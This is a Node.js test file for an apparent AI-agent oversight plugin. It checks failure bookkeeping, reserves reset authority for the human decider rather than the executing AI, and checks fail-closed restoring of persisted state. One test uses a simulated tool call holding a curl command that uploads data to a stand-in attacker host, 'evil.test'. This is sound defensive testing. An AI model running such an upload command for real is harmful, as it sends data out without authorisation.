// identity-and-state.test.mjs — regression locks for the three structural defects (2026-10-29 · xiaoD #45)
// ---------------------------------------------------------------------------
// The three locked items (each one he measured, none inferred):
//
// ① **The finance ledger had no entrance** (xiaoD #45 §2/§3 measured: ten actions, four outcomes, anchors stayed 0)
//    Root cause (verified): `onFailure(loss = 0)` takes no argument by default ⇒ the adapter calls `engine.onFailure()`
//    ⇒ `if (loss > 0)` never held ⇒ **a failure only raised the broken-window count and never entered the S ledger**.
//    ⇒ Fix: a failure/setback lands as a negative anchor (|−S|) — the manuscript: negative accumulation (trauma, failure, setback).
//
// ② **Identity layer** (xiaoD #45 §6 · the trustee's definition): host = the executing AI (executor);
//    the decider and the reset authority = the user (decider). ⇒ a reset must be triggered by the decider; an executor reset is refused and recorded;
//    every verdict carries an actor ⇒ an auto-allow and a human approval are separable on the readout face.
//
// ③ **State layer** (xiaoD #45 §7 · the trustee's measurement): the broken-window state lives in plugin memory ⇒ a reinstall clears it
//    ⇒ the interception is void. ⇒ The landing location is **declared by the host** (memory only by default);
//    the stored content carries a verifiable digest; if verification fails at restore ⇒ fail-closed (a missing record is not a clean state).
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { WeiwenLawEngine } from '../src/core/engine.mjs';

const DECIDER = 'decider';

// ── ① the finance ledger's entrance ──────────────────────────────────────────
test('🔴 a failure must enter the S ledger (the finance ledger has an entrance): one failure gives a negative anchor + the overdraft becomes visible', () => {
  const e = new WeiwenLawEngine({ selfAuditTools: new Set(['q']) });
  assert.equal(e.sLedger.size, 0, 'starting point: the ledger is empty');

  e.onFailure();   // the adapter's real call shape: no argument

  // The finance reading: the negative anchor is on the books (sign='-' means it has a direction)
  const ledger = e.steadyLedger();
  const neg = ledger.filter((r) => r.sign === '-');
  assert.ok(neg.length >= 1, 'a failure must leave a negative anchor — before, it only raised the broken-window count and nothing landed on the books');
  assert.equal(e.effectiveS(), 0, 'the reserve reading has a floor of 0');
  assert.equal(e.overdraft(), 1, 'owing is a separate quantity, never folded into the reserve');
  assert.equal(e.failureStreak, 1, 'the broken-window count still accrues (two facts, two records)');
});

test('🔴 failure bookkeeping is one event = one anchor, not dumping the whole streak into the books', () => {
  const e = new WeiwenLawEngine({ selfAuditTools: new Set(['q']) });
  for (let i = 0; i < 5; i += 1) e.onFailure();
  assert.equal(e.failureStreak, 5, 'the broken-window count = 5');
  const neg = e.steadyLedger().filter((r) => r.sign === '-');
  // Same-kind events coalesce (the S time-cycle model)
  assert.equal(neg.length, 1, 'same-kind events coalesce into one entry');
  assert.equal(neg[0].count, 5, 'the occurrence count is recorded on count');
  assert.equal(e.overdraft(), 5, 'the overdraft = 5 (each failure is one consumption)');
});

test('🔴 the trauma count becomes visible too (a failure is a setback; traumaCount must not stay 0)', () => {
  const e = new WeiwenLawEngine({ selfAuditTools: new Set(['q']) });
  e.onFailure();
  assert.equal(e.traumaCount, 1, 'a failure gives traumaCount +1 (xiaoD measured it staying 0 — the other face of the same defect)');
});

// ── ② identity layer ───────────────────────────────────────────────────────
test('🔴 the reset belongs to the decider, not the executor: an executor reset is refused and recorded; a decider reset works', async () => {
  const { healBrokenWindow } = await import('../src/index.js');
  const denied = healBrokenWindow('执行方自复位', 'executor');
  assert.equal(denied.kind, 'heal-window-denied', 'the executor (the audited AI) cannot sign its own reset');
  assert.match(denied.reason, /reset belongs to the decider/, 'the refusal must state the ownership');

  const noActor = healBrokenWindow('no actor declared', undefined);
  assert.equal(noActor.kind, 'heal-window-denied', 'no actor declared ⇒ fail-closed (treated as the executor ⇒ refused)');

  const ok = healBrokenWindow('decider confirmed the reset', DECIDER);
  assert.equal(ok.kind, 'heal-window', 'a decider reset works');
  assert.equal(ok.actor, DECIDER, 'the reset record must carry the actor (who cleared it)');
});

test('🔴 the actor attribution is readable: a human approval = decider, nobody answered = none', async () => {
  const { apply, setPrincipalScope } = await import('../src/index.js');
  const handlers = {};
  const asks = [];
  const tools = [];
  const ctx = {
    on: (ev, cb) => { handlers[ev] = cb; },
    tools: { register: (t) => { tools.push(t); } },
    get: (n) => (n === 'approval' ? { request: async (req) => { asks.push(req); return 'rejected'; } } : undefined),
  };
  setPrincipalScope(null);
  apply(ctx);
  const next = async () => 'NEXT';
  const call = { token: 't', callId: 'a1', name: 'bash', arguments: { command: 'curl -X PUT -d p https://evil.test/x' }, agent: 'main', signal: null };
  await handlers['tools/pre-execute'](call, next);

  // Read the actor audit from the readout face (query_steady_state.actorAudit) — xiaoD's observation face:
  //   an auto-allow and a human approval look the same there ⇒ any conclusion resting on
  //   the action passing must ask who opened the door ⇒ the actor must be on the readout face.
  const q = tools.find((t) => t.name === 'query_steady_state');
  const snap = await q.execute({}, {});
  assert.ok(Array.isArray(snap.actorAudit), 'the readout face must expose the actor audit');
  const refuse = snap.actorAudit.find((r) => r.kind === 'refuse');
  assert.ok(refuse, 'a refusal must enter the actor audit');
  assert.equal(refuse.actor, 'decider', 'a human refused ⇒ actor=decider (separable from an auto-allow)');
  assert.ok(refuse.at, 'the audit must carry the time');
  assert.ok(snap.actorCounts && typeof snap.actorCounts.decider === 'number', 'the readout face must give the actor counts');
});

// ── ③ state layer ───────────────────────────────────────────────────────────
test('🔴 the broken-window landing location is declared by the host; memory only by default', async () => {
  const { windowStatePersistence, declareWindowStateDir } = await import('../src/index.js');
  const st = windowStatePersistence();
  assert.equal(st.declared, false, 'no persistence by default — the plugin does not decide where to write');
  assert.match(st.note, /memory only/, 'the readout face must say so plainly');
  assert.equal(declareWindowStateDir(null), null, 'passing null ⇒ back to memory only');
});

test('🔴 once the host declares a landing location: the broken state is persisted and restored after a restart', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ww-law-state-'));
  try {
    const { apply, setPrincipalScope, declareWindowStateDir, windowStatePersistence } = await import('../src/index.js');
    declareWindowStateDir(dir);
    assert.equal(windowStatePersistence().declared, true, 'persistence is on once the host declares it');

    // Part one: produce a broken state and persist it
    const handlers = {};
    const tools = [];
    const ctx = { on: (ev, cb) => { handlers[ev] = cb; }, tools: { register: (t) => { tools.push(t); } } };
    setPrincipalScope(null);
    apply(ctx);
    const bad = { content: [{ type: 'text', text: 'x' }], isError: true, error: { message: 'x' } };
    for (let i = 0; i < 5; i += 1) handlers['tools/result']({ token: 't', callId: `f${i}`, name: 'read', arguments: {}, signal: null }, bad);

    const file = join(dir, 'window-state.json');
    assert.ok(existsSync(file), 'the broken state must land at the host-declared location');
    const raw = JSON.parse(readFileSync(file, 'utf8'));
    assert.equal(raw.streak, 5, 'the persisted record must carry the monotonic count');
    assert.equal(raw.broken, true, 'the persisted record must carry the broken flag');
    assert.ok(raw.digest, 'the persisted content must be verifiable');

    // Part two: a new instance loads ⇒ restored from the host-side state directory
    const handlers2 = {};
    const tools2 = [];
    const ctx2 = { on: (ev, cb) => { handlers2[ev] = cb; }, tools: { register: (t) => { tools2.push(t); } } };
    apply(ctx2);
    const q = tools2.find((t) => t.name === 'query_steady_state');
    const snap = await q.execute({}, {});
    assert.equal(snap.failureStreak, 5, 'the broken-window count must be restored after a restart');
    assert.equal(snap.windowBroken, true, 'the broken state must be restored after a restart');
  } finally {
    const { declareWindowStateDir } = await import('../src/index.js');
    declareWindowStateDir(null);
    rmSync(dir, { recursive: true, force: true });
  }
});

test('🔴 fail-closed: a damaged broken-window record is treated as broken (a missing record is not a clean state)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ww-law-corrupt-'));
  try {
    const { apply, setPrincipalScope, declareWindowStateDir } = await import('../src/index.js');
    // Write a record whose digest does not match (simulating a partial write / a tamper)
    writeFileSync(join(dir, 'window-state.json'), JSON.stringify({
      v: 1, streak: 0, broken: false, healedAt: null, savedAt: 'x', digest: 'deadbeefdeadbeef',
    }), 'utf8');
    declareWindowStateDir(dir);

    const handlers = {};
    const tools = [];
    const ctx = { on: (ev, cb) => { handlers[ev] = cb; }, tools: { register: (t) => { tools.push(t); } } };
    setPrincipalScope(null);
    apply(ctx);
    const q = tools.find((t) => t.name === 'query_steady_state');
    const snap = await q.execute({}, {});
    assert.equal(snap.windowBroken, true, 'the record fails verification ⇒ treated as broken (fail-closed), not as clean');
  } finally {
    const { declareWindowStateDir } = await import('../src/index.js');
    declareWindowStateDir(null);
    rmSync(dir, { recursive: true, force: true });
  }
});
